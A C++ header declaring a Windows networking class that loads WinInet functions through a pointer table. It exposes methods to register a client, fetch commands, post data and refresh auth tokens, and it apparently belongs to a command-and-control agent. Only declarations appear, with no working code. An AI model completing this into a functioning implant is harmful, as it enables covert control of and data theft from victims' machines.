#pragma once
#include <Windows.h>
#include <wininet.h>
#include "common.hpp"

#define DECL(x) decltype(x) * x;

struct HTTPAPIS {
	// WinInet
	DECL(InternetOpenA);
	DECL(InternetConnectA);
	DECL(HttpOpenRequestA);
	DECL(HttpSendRequestA);
	DECL(InternetReadFile);
	DECL(InternetCloseHandle);
	DECL(InternetSetOptionA);
	DECL(HttpAddRequestHeadersA);
};

class Network {
	HTTPAPIS* httpFunctions;
	PCHAR baseurl;
	PCHAR postendpoint;
	PCHAR getendpoint;
	PCHAR registerendpoint;
	PCHAR authToken;
	PCHAR refreshToken;
	PCHAR ClientID;
	INT UseSSL;
	INT Attemps;
	DWORD flags;

public:
	Network();

	BOOL RegisterClient(BYTE* data, size_t length, _Out_ PCHAR ResponseData, DWORD ResponseBufferSize, DWORD* ResponseLength);
	BOOL GetCommand(_Out_ PCHAR CommandData, SIZE_T BufferSize, _Out_ INT* TotalRead);
	BOOL UpdateAuthDetails(PCHAR token, PCHAR refresh, PCHAR ClientID);
	BOOL PostData(_In_ BYTE* Data, SIZE_T DataLength);
	BOOL CheckAndSetSSL(HINTERNET hReq);
	



};

extern Network* g_NetworkManager;
